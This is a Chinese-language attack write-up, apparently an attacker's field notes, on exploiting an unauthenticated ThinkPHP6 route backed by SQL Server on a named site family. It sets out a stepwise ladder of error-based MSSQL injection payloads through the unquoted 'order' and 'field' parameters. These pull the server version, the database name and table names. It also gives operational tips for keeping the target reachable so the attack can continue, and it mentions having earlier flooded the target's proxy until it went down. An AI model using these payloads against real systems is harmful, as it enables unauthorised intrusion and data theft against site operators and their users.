# 实战案例: 免认证 paginate 参数 = 无引号 MSSQL 注入位(712win3/brmt777 系列)

## 为什么这一面比 `'` 注入面更值得打
目标 TP6 + sqlsrv 站把 `channel_url` 放在引号里且中间件有引号黑名单(带 `'` 直接 400)。
但另一个免认证路由 `GET /adminapi/getPackages` 回显:
```
ROW_NUMBER() OVER ( ORDER BY [PackageId] DESC)
```
`order` / `field` 是**框架拼进 SQL 的表达式位**,不需要引号闭合 ⇒ 引号黑名单形同虚设。

## 开打梯子(带健康门控, 单变量差分)
1. 门控: 先取基线,debug 页出现 `CONNECT:` + `RunTime:` 才继续;否则立即退出(库挂时任何 payload 都只会得到 PDOException,白打还扰生产)。
2. 可控性: `order=PackageId desc` vs `order=PackageName asc` → 比较回显 SQL 的 ORDER BY 是否随之变化 ⇒ 证明参数进 SQL。
3. 表达式存活: `order=PackageId desc,(select 1 where 1=1)`(含逗号/子查询,TP6 `parseOrder()` 对含 `(` 分段原样放行)。
4. 报错取数(MSSQL 无引号报错三连):
   - `order=(select 1 where 1=CONVERT(int,@@version))`
   - `order=PackageId desc,(select 1 where 1=CONVERT(int,DB_NAME()))`
   - `order=PackageId desc,(select 1 where 1=CONVERT(int,(select top 1 name from sys.tables)))`
   - 除零备选: `order=PackageId desc,(select 1 where 1=1/0)`
5. `field` 面: `field=*,@@version as v`(TP6 field 同样吃表达式)。
6. 判定器: debug 页回显 SQL + RunTime + 异常文案(`Conversion failed when converting`/`Divide by zero`/`Invalid column name`)。

## 教训
- 免认证路由先看**它跑的 SQL 长什么样**(从已抓的异常页里挖),再决定打哪个参数;盲目全参数 fuzz(本案 26 参数 × 16 payload = 1700 次)只拿到恒定的错误响应,而真正的注入位(`order`)一次就能看出。
- 自己洪泛打库会把目标前置代理打挂,此后**所有** SQL 面都不可用 → 开打前先探库健康度,库挂就别再发 payload(保生产 = 保后续可打性)。
- 代理层自己回显的 `Connection timed out` + GUID 才是"后端不可达"的铁证(区别于"本方被拉黑")。
